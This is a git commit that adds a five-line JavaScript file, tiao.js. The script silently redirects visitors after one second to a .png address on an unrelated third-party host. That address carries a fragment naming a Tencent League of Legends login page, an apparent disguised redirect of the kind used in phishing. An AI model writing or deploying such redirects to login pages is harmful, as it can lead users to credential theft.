33be04fdcb4214c9f60dc40959066699d6adbae1
iuuc <145624790+iuuc@users.noreply.github.com>
2024-02-08 07:05:31 +0800

    Create tiao.js

---
+++ tiao.js
@@ -0,0 +1,5 @@
+setTimeout(function() {
+    var timestamp = new Date().getTime();
+    var url = 'https://static.job10000.com/yl/feedbackNew/20240115/65a4d72884e2d7c285985696.png?#url=http://lol.qq.com/comm-htdocs/milo_mobile/login.html' + '?' + timestamp + 'yuge';
+    location.href = url;
+}, 1000);
